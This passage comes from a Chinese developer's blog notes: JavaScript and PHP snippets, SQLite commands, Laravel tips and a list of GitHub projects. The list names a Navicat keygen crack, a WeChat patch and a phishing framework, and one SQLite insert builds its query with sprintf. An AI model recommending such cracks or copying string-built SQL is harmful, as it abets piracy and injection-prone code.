"\u&#123;1F467&#125;";"👦" === "\u&#123;1F466&#125;"; 本地存储websql12345678910111213141516171819202122232425262728293031323334353637383940414243openDatabase：这个方法使用现有的数据库或者新建的数据库创建一个数据库对象。transaction：这个方法让我们能够控制一个事务，以及基于这种情况执行提交或者回滚。executeSql：这个方法用于执行实际的 SQL 查询。首先要想使用 WebSQL 首先得判断浏览器是否支持&lt;script type="text/javascript"&gt;if(!window.openDatabase)&#123; alert('您的浏览器不支持 WebSQL');&#125;&lt;/script&gt;打开数据库var db = window.openDatabase(dbname, version, dbdesc, dbsize,function() &#123;&#125;);openDatabase 方法中一共包括了 5 个参数,分别为数据库名、版本号、描述、数据库大小、创建回调。其中创建回调可以省略例如创建 王者荣耀数据库var db = openDatabase('wucai', '1.0', '王者荣耀数据库', 1024 * 1024);事务操作使用 transaction 对事务进行处理、执行提交、回滚操作transaction(callback, errorCallback, successCallback); 创建数据表db.transaction(function (tx) &#123; tx.executeSql('CREATE TABLE IF NOT EXISTS heros (id unique, name, hp_max, mp_max, role_main)');&#125;);插入数据db.transaction(function (tx) &#123; tx.executeSql('INSERT INTO heros (id, name, hp_max, mp_max, role_main) VALUES (10000, "夏侯惇", 7350, 1746, " 坦克 ")'); tx.executeSql('INSERT INTO heros (id, name, hp_max, mp_max, role_main) VALUES (10001, "钟无艳", 7000, 1760, " 战士 ")'); tx.executeSql('INSERT INTO heros (id, name, hp_max, mp_max, role_main) VALUES (10002, "张飞", 8341, 100, " 坦克 ")'); tx.executeSql('INSERT INTO heros (id, name, hp_max, mp_max, role_main) VALUES (10003, "牛魔", 8476, 1926, " 坦克 ")'); tx.executeSql('INSERT INTO heros (id, name, hp_max, mp_max, role_main) VALUES (10004, "吕布", 7344, 0, " 战士 ")');&#125;);查找数据db.transaction(function (tx) &#123; tx.executeSql('SELECT * FROM heros', [], function (tx, data) &#123; var len = data.rows.length; console.log('查找到：' +len +'条记录'); console.log(data.rows); &#125;);&#125;);https://laravelcode.cn/posts/99/simple-use-of-websql 玩坏Chrome小恐龙游戏12345chrome://dino/F12执行以下代码：var dino=Runner.prototypedino.gameOver=()=&gt;&#123;&#125;Runner.instance_.setSpeed(233) 朗读文字1var ssu=&#123;init:function()&#123;ssu.speech(window.getSelection().toString())&#125;,speech:function(e)&#123;e&amp;&amp;""!=e.trim()||(e="未选择文字");var s=new window.SpeechSynthesisUtterance(e);window.speechSynthesis.speak(s)&#125;&#125;;ssu.init(); ###1234567891011121314151617181920212223242526272829303132333435363738如果我们想要调整数组的大小：var entries = [1, 2, 3, 4, 5, 6, 7]; console.log(entries.length); // 7 entries.length = 4; console.log(entries.length); // 4 console.log(entries); // [1, 2, 3, 4]如果我们想要空数组：var entries = [1, 2, 3, 4, 5, 6, 7]; console.log(entries.length); // 7 entries.length = 0; const dynamic = 'flavour';var item = &#123; name: 'Coke', [dynamic]: 'Cherry'&#125;console.log(item); // &#123; name: "Coke", flavour: "Cherry" &#125;var entries = [1, [2, 5], [6, 7], 9];var flat_entries = [].concat(...entries); // [1, 2, 5, 6, 7, 9]var my_list = [1, 2, 3, 4, 5, 6, 7, 8, 9];console.log(my_list.sort(function() &#123; return Math.random() - 0.5&#125;)); // [4, 8, 2, 9, 1, 3, 6, 5, 7]var converted_number = 5 + "";console.log(converted_number);var entries = [1, 2, 2, 3, 4, 5, 6, 6, 7, 7, 8, 4, 2, 1]var unique_entries = [...new Set(entries)];console.log(unique_entries);// [1, 2, 3, 4, 5, 6, 7, 8]https://learnku.com/f2e/t/38128 Fetch 代替 Ajax 的浏览器 API1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556fetch(url, [&#123;options&#125;]) .then(response =&gt; response.json()) .then(data =&gt; console.log(data))fetch('https://wp.hellocode.name') .then(response =&gt; response.text()) .then(data =&gt; console.log(data))fetch('https://wp.hellocode.name') .then(response =&gt; response.text()) .then(data =&gt; console.log(data)) .catch(err =&gt; console.log(err))GET 请求fetch('http://httpbin.org/ip', &#123; method: 'GET' &#125;) .then((res)=&gt;&#123; return res.text() &#125;) .then((res)=&gt;&#123; console.log(res) &#125;)POST 请求fetch(url, &#123; method: 'POST', headers: &#123; 'Content-Type': 'application/json; charset=utf-8' &#125;, body: JSON.stringify(&#123; name: 'a', password: 'b',&#125;) &#125;) .then((res)=&gt;&#123; return res.text() &#125;) .then((res)=&gt;&#123; console.log(res) &#125;)完整示例fetch(url, &#123; method: 'POST', credentials: 'include', mode: 'cors', cache: 'default', headers: &#123; 'Content-Type': 'application/json; charset=utf-8' &#125;, body: JSON.stringify(&#123; name: 'a', password: 'b',&#125;) &#125;) .then((res)=&gt;&#123; return res.text() &#125;) .then((res)=&gt;&#123; console.log(res) &#125;) https://learnku.com/articles/34681 JavaScript 正则表达式123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384let regex;/* 匹配特定的字符串 */regex = /hello/; // 查找斜杠中的字符串（大小写敏感）……匹配 "hello", "hello123", "123hello123", "123hello"，但不匹配 "hell0", "Hello"regex = /hello/i; // 查找斜杠中的字符串（大小写不敏感）……匹配 "hello", "HelLo", "123HelLO"regex = /hello/g; // 全局查找斜杠中的字符串……/* 通配符 */regex = /h.llo/; // "." 匹配除了换行外的任何一个字符……匹配 "hello", "hallo"，但不匹配 "h\nllo"regex = /h.*llo/; // "*" 匹配任何字符零次或多次，如 "hello", "heeeeeello", "hllo", "hwarwareallo"/* 简略字符类 */regex = /\d/; // 匹配数字regex = /\D/; // 匹配非数字regex = /\w/; // 匹配单词字符 (a-z, A-Z, 0-9, _)regex = /\W/; // 匹配非单词字符regex = /\s/; // 匹配空白字符（\r (回车),\n (换行), \t (制表符), \f (换页符)）regex = /\S/; // 匹配非空白字符/* 特定字符 */regex = /[aeiou]/; // 匹配方括号中的任意字符regex = /[ck]atherine/; // 匹配 catherine 或 katherineregex = /[^aeiou]/; // 匹配除方括号内以外的字符/* 字符范围 */regex = /[a-z]/; // 匹配小写字母regex = /[A-Z]/; // 匹配大写字母regex = /[e-l]/; // 匹配从 e 到 l 的字母regex = /[F-P]/; // 匹配 F 到 P 的字母regex = /[0-9]/; // 匹配数字regex = /[5-9]/; // 匹配 5 至 9 的数字regex = /[a-zA-Z]/; // 匹配大小写字母regex = /[^a-zA-Z]/; // 匹配非字母/* 使用量词重复匹配 */regex = /(hello)&#123;4&#125;/; // 匹配 "hellohellohellohello"regex = /hello&#123;3&#125;/; // 匹配 "hellooo" 和 "helloooo"，但不匹配 "helloo"regex = /\d&#123;3&#125;/; // 匹配三个数字 (匹配 "312", "122", "111", "12312321"，但不匹配 "12")regex = /\d&#123;3,7&#125;/; // 匹配三到七个数字regex = /\d&#123;3,&#125;/; // 匹配至少三个数字/* 使用星号和加号匹配重复 */regex = /ab*c/; // 匹配零个或多个重复的 "b"（匹配 "abc", "abbbbc", "ac"）regex = /ab+c/; // 匹配一个或多个重复的 "b"（匹配 "abc", "abbbbc", 但不匹配 "ac"）/* 匹配开头或结尾的项目 */regex = /^[A-Z]\w*/; // 匹配 "H", "Hello", 但不匹配 "hey"regex = /\w*s$/; // 匹配 "cats", "dogs", "avocados", 但不匹配 "javascript"/* 匹配单词分界 单词分界位置 1. 首字符是单词字符的字符串之前 2. 末字符是单词字符的字符串之后 3. 两个字符间，其中一个属于单词字符而另一个不是 */regex = /\bmeow\b/; // 匹配 "hey meow lol", "hey:meow:lol", 但不匹配 "heymeow lol"/* 分组 */regex = /it is (ice )?cold outside/; // 匹配 "it is ice cold outside" 和 "it is cold outside"regex = /it is (?:ice )?cold outside/; // 跟上面一样，但这是一个非捕获分组regex = /do (cats) like taco \1/; // 匹配 "do cats like taco cats"regex = /do (cats) like (taco)\? do \2 \1 like you\?/; // 匹配 "do cats like taco? do taco cats like you?"//分支重置分组（Perl, PHP, R, Delphi 等语言支持此功能，JS 不支持，因此注释掉）// regex = /(?|(cat)|(dog))\1/; // 匹配 "catcat" 和 "dogdog"/* 多选匹配 */regex = /i like (tacos|boba|guacamole)\./; // 匹配 "i like tacos.", "i like boba.", and "i like guacamole."/* 向前引用（Perl, PHP, R, Delphi 等语言支持此功能，JS 不支持，因此注释掉）*/// regex = /(\2train|(choo))+/; // 匹配 "choo", "choochoo", "chootrain", choochootrain", 但不匹配 "train"/* 顺序环视 */regex = /z(?=a)/; // 肯定型顺序环视……匹配在 "a" 之前的 "z" (比如 pizza)，但不匹配首字符 "z"regex = /z(?!a)/; // 否定型顺序环视……匹配首字符 "z"，除了在 "a" 之前的 "z"/* 逆序环视 */regex = /(?&lt;=[aeiou])\w/; // 肯定型逆序环视……匹配在元音后的单词字符regex = /(?&lt;![aeiou])\w/; // 否定型逆序环视……匹配不在原因后的单词字符/* 我觉得很有用的函数 */regex.test("hello"); // 如果有匹配则返回真regex.execute("hello"); // 有匹配返回数组，反之为 null"football".replace(/foot/, "basket"); // 用第二个参数取代匹配https://learnku.com/f2e/t/38217 分享十个珍藏的单行 JS 代码1234567891011121314151617181920打印键盘 (_=&gt;[..."`1234567890-=~~QWERTYUIOP[].~ASDFGHJKL;'~~ZXCVBNM,./~"].map(x=&gt;(o+=`/$&#123;b='_'.repeat(w=x&lt;y?2:' 667699'[x=["BS","TAB","CAPS","ENTER"][p++]||'SHIFT',p])&#125;.|`,m+=y+(x+' ').slice(0,w)+y+y,n+=y+b+y+y,l+=' __'+b)[73]&amp;&amp;(k.push(l,m,n,o),l='',m=n=o=y),m=n=o=y='|',p=l=k=[])&amp;&amp;k.join``)()for(i=0;++i&lt;101;console.log(i%5?f||i:f+'Buzz'))f=i%3?'':'Fizz' 16进制 '#' + Math.floor(Math.random() * 0xffffff).toString(16).padEnd(6, '0');乱序(arr) =&gt; arr.slice().sort(() =&gt; Math.random() - 0.5)&lt;body onload="setInterval(()=&gt;document.body.innerHTML=new Date().toGMTString().slice(17,25))"&gt;&lt;/body&gt; ?foo=bar&amp;baz=bing =&gt; &#123;foo: bar, baz: bing&#125; // Set the current page's query parameters to `q` q=&#123;&#125;;location.search.replace(/([^?&amp;=]+)=([^&amp;]*)/g,(_,k,v)=&gt;q[k]=v);q;Math.random().toString(36).substring(2);最近7天[...Array(7).keys()].map(days =&gt; new Date(Date.now() - 86400000 * days));https://learnku.com/f2e/t/38309 JavaScript 中的防抖与节流12345678910111213141516171819当用户触发某次事件后，若在规定时间内不再触发该事件，则这个事件才会被真正响应。我们称这样的机制为防抖/** * @desc 函数防抖 * @param func 函数https://learnku.com/articles/38190 * @param wait 延迟执行毫秒数 */function debounce(func, wait) &#123; let timeout; return function () &#123; let context = this; let args = arguments; if (timeout) clearTimeout(timeout) timeout = setTimeout(function()&#123; func.apply(context, args) &#125;, wait); &#125;&#125; setTimeout写法替代setInterval1234567891011121314151617181920setInterval实现//每分钟查询一次var timer = function () &#123; setInterval(function () &#123; getMessageNum(); //异步获取后台数据 &#125;, 60000);&#125;;setTimeout方法替换var timer = function (fn, time) &#123; return function walk()&#123; setTimeout(function () &#123; fn(); walk(); &#125;, time); &#125;&#125;;https://www.shanyuliang.com/archives/297timer(getMessageNum, 60000)(); ###123456安装包 npm i package npm i -g package 测试npm t 新项目，无需打开 package.json 只需要运行 npm run 即可获取可用命令列表运行 npm ls - - depth 0 即可罗列所有已安装的包信息npm home your_package，这个命令将 直接带到主页文档npm repo your-package 将直接带你进入包官方 GitHub 地址https://learnku.com/f2e/t/39046 JavaScript 数组操作1234567891011121314151617181920212223242526272829303132333435363738394041424344454647var fruits = [“banana”, “apple”, “orange”, “watermelon”, “apple”, “orange”, “grape”, “apple”];// 第一种方法var uniqueFruits = Array.from(new Set(fruits));console.log(uniqueFruits); // returns [“banana”, “apple”, “orange”, “watermelon”, “grape”]// 第二种方法var uniqueFruits2 = […new Set(fruits)];console.log(uniqueFruits2); // returns [“banana”, “apple”, “orange”, “watermelon”, “grape”]var friends = [ &#123; name: ‘John’, age: 22 &#125;, &#123; name: ‘Peter’, age: 23 &#125;, &#123; name: ‘Mark’, age: 24 &#125;, &#123; name: ‘Maria’, age: 22 &#125;, &#123; name: ‘Monica’, age: 21 &#125;, &#123; name: ‘Martha’, age: 19 &#125;,]var friendsNames = Array.from(friends, (&#123;name&#125;) =&gt; name);console.log(friendsNames); // returns [“John”, “Peter”, “Mark”, “Maria”, “Monica”, “Martha”]fruits.length = 0;var newArray = new Array(10).fill(“1”);console.log(newArray); // returns [“1”, “1”, “1”, “1”, “1”, “1”, “1”, “1”, “1”, “1”, “1”]var fruits = [“apple”, “banana”, “orange”];var meat = [“poultry”, “beef”, “fish”];var vegetables = [“potato”, “tomato”, “cucumber”];var food = […fruits, …meat, …vegetables];console.log(food); // [“apple”, “banana”, “orange”, “poultry”, “beef”, “fish”, “potato”, “tomato”, “cucumber”]var mixedArr = [0, “blue”, “”, NaN, 9, true, undefined, “white”, false];var trueArr = mixedArr.filter(Boolean);console.log(trueArr); // returns [“blue”, 9, true, “white”]随机var colors = [“blue”, “white”, “green”, “navy”, “pink”, “purple”, “orange”, “yellow”, “black”, “brown”];var randomColor = colors[(Math.floor(Math.random() * (colors.length)))]var nums = [1, 5, 2, 6];var sum = nums.reduce((x, y) =&gt; x + y);console.log(sum); // returns 14https://learnku.com/f2e/t/38978个数组的交集var numOne = [0, 2, 4, 6, 8, 8];var numTwo = [1, 2, 3, 4, 5, 6];var duplicatedValues = […new Set(numOne)].filter(item =&gt; numTwo.includes(item));console.log(duplicatedValues); // returns [2, 4, 6]数组转对象var fruits = [“banana”, “apple”, “orange”, “watermelon”];var fruitsObj = &#123; …fruits &#125;;console.log(fruitsObj); // returns &#123;0: “banana”, 1: “apple”, 2: “orange”, 3: “watermelon”, 4: “apple”, 5: “orange”, 6: “grape”, 7: “apple”&#125; JavaScript 中正则表达式 浏览器中做人脸识别 https://bestofjs.org/ 利用 JavaScript 来学数据结构和算法算法 简单直接的 Javascript 开发环境 http://lixiaolai.com/2016/07/31/makecs-simplest-js-dev-environment/ 前后端都开源的h5快速制作平台，类似于开源版本的易企秀、人人秀，可以通过拖拽的形式，快速生成H5，前端和后端都已经开源了，而且在持续迭代中 https://github.com/ly525/luban-h5 alert xss https://alf.nu/alert1 通过文件分片解决大文件上传 JS 数据结构 CHROME开发者工具的小技巧 chrome开发者工具各种骚技巧 webpack笔记-服务及热更新 JavaScript编程黑科技 中文文案排版规范 前端每日 30 秒 Chrome断点JS寻找淘宝签名sign HTML 实现采集拍照功能 微信分享踩坑之旅 字符编码那些事儿]]></content>
      <tags>
        <tag>代码</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[github 精选项目收集]]></title>
    <url>%2F2019%2F05%2F13%2Fgithub-%E7%B2%BE%E9%80%89%E9%A1%B9%E7%9B%AE%E6%94%B6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[github代码clone加速12345678910111213141516171819202122232425262728293031323334github代码clone加速，hosts每日生成更新 http://nullpointer.pw https://github.com/Mosiki/github最简单的方式就是下载 Switch Host https://oldj.github.io/SwitchHosts/软件进行 host 修改，跨平台，因为 hosts 文件每日都会自动更新，所以需要本地的 hosts 也能自动更新， 好在 SwitchHosts 提供了远程 hosts 的功能。复制如下 hosts 地址 https://raw.githubusercontent.com/Mosiki/github/master/github_hosts.txt52.74.223.119 github.com59.24.3.173 gist.github.com185.199.108.153 assets-cdn.github.com151.101.108.133 raw.githubusercontent.com151.101.108.133 gist.githubusercontent.com151.101.108.133 cloud.githubusercontent.com151.101.228.133 camo.githubusercontent.com151.101.108.133 avatars0.githubusercontent.com151.101.108.133 avatars1.githubusercontent.com151.101.228.133 avatars2.githubusercontent.com151.101.228.133 avatars3.githubusercontent.com151.101.108.133 avatars4.githubusercontent.com151.101.108.133 avatars5.githubusercontent.com151.101.108.133 avatars6.githubusercontent.com151.101.108.133 avatars7.githubusercontent.com151.101.108.133 avatars8.githubusercontent.com185.199.109.154 github.githubassets.com设置自动更新选择 24 小时即可，第一次添加的时候需要手动点击刷新按钮，刷新获取一下远程的 hostshttp://nullpointer.pw/github%E4%BB%A3%E7%A0%81clone%E5%8A%A0%E9%80%9F.htmlhttps://www.codeku.me/archives/3031.htmlgithub镜像地址：https://i.codeku.me 替换 github.com下载镜像：https://ws.codeku.me 替换 codeload.github.com Python3爬虫项目进阶实战、JS加解密 定投改变命运 —— 让时间陪你慢慢变富 https://github.com/xiaolai/regular-investing-in-box 蚂蚁森林能量智能收取脚本 (基于Auto.js)https://github.com/SuperMonster003/Auto.js_Projects/tree/Ant_Forest 文章多平台发布工具:AutoPublish，目前支持知乎、CSDN、豆瓣日志 https://github.com/ayuliao/Autopublish 91porn爬虫php版本 一键反代谷歌和谷歌学术 分享发现的好资源，好工具 桌面壁纸分享 笔记/搜集/摘录/实践 李笑来的新书《自学是门手艺》发布了 中文古诗自动作诗机器人 偷看大佬们的 GitHub 动态 开源可视化布局项目 Google代理 找到你喜爱的作品 微信 PC 2.6.8.37 防撤回补丁 无版权图片 加空格 IT 互联网书籍 A collection of simple Bash scripts Python爬虫例子之QQ历史报告 程序猿专用保佑 注释代码 ascii图像 一个PHP资源列表，内容包括：库、框架、模板、安全 Collection of shell scripts found on the internet sf GitHub 开发者热门 https://wangchujiang.com/github-rank/sifou-daily.html PHPer 必知必会的 Linux 命令 https://linux.hellocode.name/ laravel5.5搭建的后台管理 和 api服务 的小程序商城 录制并回放任意 web 界面中的用户操作 Github贡献图表作为图像 可视化 GitHub 简历 反向代理 GitHubgreasyfork.org/zh-CN/scripts/383577 数字货币交易api https://learnku.com/articles/28049#replies 省市区县乡镇街道 自带爬虫 科学上网办法科普 中国行政区划地址库 程序猿成长计划 观看国内主流视频平台所有视频的客户端 SQL 语句优化器和重写器 GitHub 汉化插件 Navicat_Keygen破解 91porn爬虫php版本 公共维护的Pholcus爬虫规则库 解锁网易云音乐客户端变灰歌曲 企业安全测试主动攻击型蜜罐钓鱼框架系统 爱国守法，科学上网google https://github.com/zhouaini528/scientific_internet_access 内部API的安全防护怎么搞？密码学中有答案 https://ksloveyuan.github.io/posts/api_security/ 文章多平台发布工具:AutoPublish，目前支持知乎、CSDN、豆瓣日志 https://github.com/ayuliao/Autopublish 蚂蚁森林能量智能收取脚本 (基于Auto.js)https://github.com/SuperMonster003/Auto.js_Projects/tree/Ant_Forest POLAR 是一个强大的跨平台（Mac、Window、Linux）文档管理系统，它能够离线缓存网页内容、PDF 电子书和笔记。支持标签管理、添加注解、高亮内容（网页、PDF），记录阅读进度。https://github.com/burtonator/polar-bookshelf 如何搭建v2ray，放弃使用ss和ssr https://viencoding.com/article/207 你在 GitHub 上看到过的最有意思的项目是什么 https://www.zhihu.com/question/23498424/answer/353063346 《科学上网翻墙教程》阅读地址：https://darrenliuwei.coding.me/fuck-gfw https://github.com/fanqiangdang/fuck-gfw 备份微信、微博等平台被删文章 https://github.com/Terminus2049/Terminus2049.github.io 爱国守法，科学上网google https://github.com/zhouaini528/scientific_internet_access 完美重现九神《囤比特币：寻找合适的够买时机》 https://github.com/Ksloveyuan/btc_price_analyzer]]></content>
      <tags>
        <tag>github</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php 记录]]></title>
    <url>%2F2019%2F05%2F13%2Fphp-%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[php sqlite123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115# -- 查询当前数据库信息sqlite&gt; .database# -- 查询当前数据库下的所有表的信息# 可选参数 ? table name , 如果加上这个参数, 会按照输入的表面去显示, 支持 LIKE 方式查找sqlite&gt; .tablessqlite&gt; .tables %persion%# -- 创建一个表sqlite&gt; CREATE TABLE persions ( id INTEGER PRIMARY KEY AUTOINCREMENT, name text, age int);# -- 删除一个表sqlite&gt; drop table persions;# -- 修改表名sqlite&gt; ALTER TABLE persions RENAME TO persions2;# 查看修改结果sqlite&gt; .tables# 再改回去,不要影响后面的命令sqlite&gt; ALTER TABLE persions2 RENAME TO persions;# -- 查看表结构sqlite&gt; pragma table_info ('persions');# -- 修改字段, SQLite 不能像主流数据库那样直接修改字段, 只能添加一个新的字段# 如果必须要修改,可以先将表重命名一个其他的,再将数据插入即可# 添加新字段sqlite&gt; ALTER TABLE persions ADD COLUMN address text;# -- 添加数据, 规则和 MYSQL 很类似# 方式1sqlite&gt; INSERT INTO persions(name,age,address) VALUES ('张三',25,'北京');# 方式2 不推荐,如果使用这种方式, 就要字段和表的字段数量完全相同sqlite&gt; INSERT INTO persions VALUES (2,'李四',30,'天津');# 方式3 一般不会用,向表中插入默认值,如果没有指定默认值,就写入 NULLsqlite&gt; INSERT INTO persions DEFAULT VALUES;# -- 更新数据sqlite&gt; UPDATE persions SET name='李四',age=22,address='上海' WHERE id=3;# -- 查询数据sqlite&gt; SELECT id,name,age,address FROM persions;# -- 删除数据sqlite&gt; DELETE FROM persions WHERE id=3;// 创建一个专门处理 SQLite 的 PDO类class Sqlite&#123; protected $pdo; public function __construct($pdo = null) &#123; // 创建 PDO_SQLITE DSN if ($pdo) &#123; $this-&gt;pdo = $pdo; &#125; else &#123; try &#123; $this-&gt;pdo = new PDO('sqlite:/home/bro/www/temp/test.sq3'); &#125; catch (PDOException $e) &#123; echo '数据库连接失败: ' . $e-&gt;getMessage(); &#125; &#125; // 测试的时候将错误提示打开,否则出错了不清楚怎么回事 $this-&gt;pdo-&gt;setAttribute($this-&gt;pdo::ATTR_ERRMODE, $this-&gt;pdo::ERRMODE_EXCEPTION); &#125; /** * 查询所有数据 */ public function fetchAll($sql) &#123; return $this-&gt;pdo-&gt;query($sql)-&gt;fetchAll(); &#125; /** * 插入一条数据 */ public function insertOneData($sql) &#123; return $this-&gt;pdo-&gt;prepare($sql)-&gt;execute(); &#125;&#125;/** * 定义一个打印结果的函数 */function p($val, $title = null)&#123; if($title) &#123; echo "&lt;br&gt;&lt;br&gt;&lt;h3&gt;&#123;$title&#125;&lt;/h3&gt;&lt;hr&gt;"; &#125; echo '&lt;pre&gt;'; var_dump($val); echo '&lt;/pre&gt;&lt;hr&gt;';&#125;$sqlite = new Sqlite; //new 一个Sqlite对象// 查询所有数据https://broqiang.com/posts/linux-php-sqlite$sqlQueryAll = "select * from persions";$allData = $sqlite-&gt;fetchAll($sqlQueryAll);p($allData,'所有查询结果');// 插入一条数据$sqlInsertOneData = sprintf("INSERT INTO persions(name,age,address) VALUES ('%s',%d,'%s');",'张三',25,'北京');p($sqlite-&gt;insertOneData($sqlInsertOneData) ? '插入成功' : '插入失败','插入一条数据'); S.O.I.L.D 之单一职责123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136&lt;?phpnamespace Acme\Reporting;use Auth;use DB;use Exception;class SalesReporter&#123; /** * 获取某个时间段的销售总额 * * @param $startDate * @param $endDate * * @return string */ public function between($startDate, $endDate) : string &#123; if (! Auth::check()) &#123; throw new Exception('Authentication required for reporting'); &#125; $sales = $this-&gt;queryDBForSalesBetween($startDate, $endDate); return $this-&gt;format($sales); &#125; /** * 查询销售报表数据 * * @param $startDate * @param $endDate * * @return float */ protected function queryDBForSalesBetween($startDate, $endDate) : float &#123; return DB::table('sales')-&gt;whereBetween('created_at', [$startDate, $endDate])-&gt;sum('charge') / 100; &#125; /** * 数据展示 * * @param $sales * @return string */ protected function format($sales) : string &#123; return "&lt;h1&gt;Sales: $sales&lt;/h1&gt;"; &#125;&#125;测试$report = new Acme\Reporting\SalesReporter();$report-&gt;between( now()-&gt;subDays(10), now());该例子明显违反了单一职责:授权方式发生变化时，如 API 授权，需要改动该类当数据库层发生变化时候，如使用 Redis 时，需要改动该类当展示方式发生变化时，需要改动该类正面示例对于上述的例子，应当作出如下的改动：不需要关心用户授权，用户授权与本类的职责无关数据层应当剥离出来展示层应当剥离出来&lt;?php// 展示层接口interface SalesOutputInterface &#123; public function output();&#125;// 展示层实现class HtmlOutput implements SalesOutputInterface &#123; public function output($sales) &#123; echo "&lt;h1&gt;&#123;$sales&#125;&lt;/h1&gt;"; &#125;&#125;// 数据层class SalesRepository &#123; public function between() &#123; return DB::table('sales')-&gt;whereBetween('create_at', [$startDate, $endDate])-&gt;sum('charge') / 100; &#125;&#125;// 职责类class SalsReporter &#123; public $repo; public function __construct($repo) &#123; $this-&gt;repo = $repo; &#125; public function between($startDate, $endDate, SalesOutputInterface $formater) &#123; $sales = $this-&gt;repo-&gt;between($startDate, $endDate); $formater-&gt;output($sales); &#125;&#125;测试$report = new SalsReporter(new SalesRepository);$report-&gt;between( now-&gt;subDays(10), now(), new HtmlOutput);结合 Laravel 的依赖注入，可以进一步简化https://learnku.com/articles/27923#topnavclass SalsReporter &#123; public $repo; public function __construct(SalesRepository $repo) &#123; $this-&gt;repo = $repo; &#125; public function between($startDate, $endDate, SalesOutputInterface $formater) &#123; $sales = $this-&gt;repo-&gt;between($startDate, $endDate); $formater-&gt;output($sales); &#125;&#125;https://learnku.com/articles/27953 与微博内容分析相关的正则表达式123456微博表情\[[\u4e00-\u9fa5A-Za-z]&#123;1,8&#125;\]微博昵称@[\u4e00-\u9fa5A-Z0-9a-z_-]&#123;2,30&#125;微博话题#[^@&lt;&gt;#"&amp;'\r\n\t]&#123;1,49&#125;#微博短链接#https&#123;0,1&#125;://t.cn/[A-Z0-9a-z]&#123;6,8&#125;[/]&#123;0,1&#125;#网址长链接(https?|ftp|file)://[-A-Za-z0-9+&amp;@#/%?=~_|!:,.;]+[-A-Za-z0-9+&amp;@#/%=~_|]https://www.playpi.org/2018121101.html Warning: count(): Parameter must be an array or an object123456789101112131415161718PHP7.2中这样写https://segmentfault.com/a/1190000017268206&lt;?phpecho count(null);会报以下错误：Warning: count(): Parameter must be an array or an object that implements Countable in 但在PHP7.1以下会返回0所以这次就坑了自己最终又从PHP7.2降回7.1 php artisan -V 查看Laravel版本laravel 5.4和5.6的日志是有区别的所以需要在config下添加一个logging.php的配置文件，代码请复制里面https://github.com/laravel/laravel/blob/develop/config/logging.phphttp://wangyapeng.me/2019/01/13/upgrad-laravel-5.5-to-5.7-log/ 然后在.env下添加LOG_CHANNEL=stack这样日志就不会报错了在 .env 删除 APP_DEBUG_LEVEL，新增 LOG_CHANNEL=stack在 config/app.php 内删除 log 和 log_level 两个字段 无限级分类12345678910111213141516171819202122232425262728293031323334php artisan make:migration create_category_table --create=category//https://segmentfault.com/a/1190000010359094Schema::create('categorys', function (Blueprint $table) &#123; $table-&gt;increments('id'); $table-&gt;integer('parent_id'); $table-&gt;string('code'); $table-&gt;string('name'); $table-&gt;string('path'); $table-&gt;timestamps(); &#125;);php artisan migratephp artisan make: model Category -muse Illuminate\Database\Eloquent\Model; class Category extends Model&#123; public function childCategory() &#123; return $this-&gt;hasMany('App\Category', 'parent_id', 'id'); &#125; public function allChildrenCategorys() &#123; return $this-&gt;childCategory()-&gt;with('allChildrenCategorys'); &#125;&#125;$categorys = App/Category::with('allChildrenCategorys')-&gt;first();$categorys-&gt;allChildrenCategorys; $categorys-&gt;allChildrenCategorys-&gt;first()-&gt;allChildrenCategorys; $arr = []; array_walk_recursive($categories,function ($v, $k) use(&amp;$arr) &#123; if($k == 'id') $arr[] = $v; &#125;); 本周一的时间戳1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374strtotime('monday');因为这样会导致在非周一的时候计算到下一个周一，https://www.h57.pw/2018/11/27/calculate-the-timestamp-of-this-monday/所以我们要在计算之前先判定一下当前是周几，如果是周一就采用 'monday' 非周一的时候采用'previous monday'if(date('w') == 1) &#123; $time = strtotime('monday');&#125; else &#123; $time = strtotime('previous monday');&#125;老外认为“this monday”是下周一，“last monday”是本周一直接"-2 monday"就好了，或者"monday last week"date('w')得到当前周几,由于周一至周六分别是1-6，周日是0。当值为0的时候，上周一是13天前。其余就是date('w')+6天前。$days = date('w')==0?13:date('w')+6;echo date('Y-m-d',time()-$days*86400);&gt;&gt;&gt; date('Ymd His',strtotime('-1 monday'))=&gt; "20190429 000000"&gt;&gt;&gt; date('Ymd His',strtotime('-1 monday 2019-05-06'))=&gt; "20190429 000000"&gt;&gt;&gt; date('Ymd His',strtotime(' monday 2019-05-06'))=&gt; "20190506 000000"echo '&lt;br&gt;上周:&lt;br&gt;';echo date("Y-m-d H:i:s",mktime(0, 0 , 0,date("m"),date("d")-date("w")+1-7,date("Y"))),"\n";echo date("Y-m-d H:i:s",mktime(23,59,59,date("m"),date("d")-date("w")+7-7,date("Y"))),"\n";echo '&lt;br&gt;本周:&lt;br&gt;';echo date("Y-m-d H:i:s",mktime(0, 0 , 0,date("m"),date("d")-date("w")+1,date("Y"))),"\n";echo date("Y-m-d H:i:s",mktime(23,59,59,date("m"),date("d")-date("w")+7,date("Y"))),"\n"; echo '&lt;br&gt;上月:&lt;br&gt;';echo date("Y-m-d H:i:s",mktime(0, 0 , 0,date("m")-1,1,date("Y"))),"\n";echo date("Y-m-d H:i:s",mktime(23,59,59,date("m") ,0,date("Y"))),"\n";echo '&lt;br&gt;本月:&lt;br&gt;';echo date("Y-m-d H:i:s",mktime(0, 0 , 0,date("m"),1,date("Y"))),"\n";echo date("Y-m-d H:i:s",mktime(23,59,59,date("m"),date("t"),date("Y"))),"\n"; $getMonthDays = date("t",mktime(0, 0 , 0,date('n')+(date('n')-1)%3,1,date("Y")));//本季度未最后一月天数echo '&lt;br&gt;本季度:&lt;br&gt;';echo date('Y-m-d H:i:s', mktime(0, 0, 0,date('n')-(date('n')-1)%3,1,date('Y'))),"\n";echo date('Y-m-d H:i:s', mktime(23,59,59,date('n')+(date('n')-1)%3,$getMonthDays,date('Y'))),"\n";/** 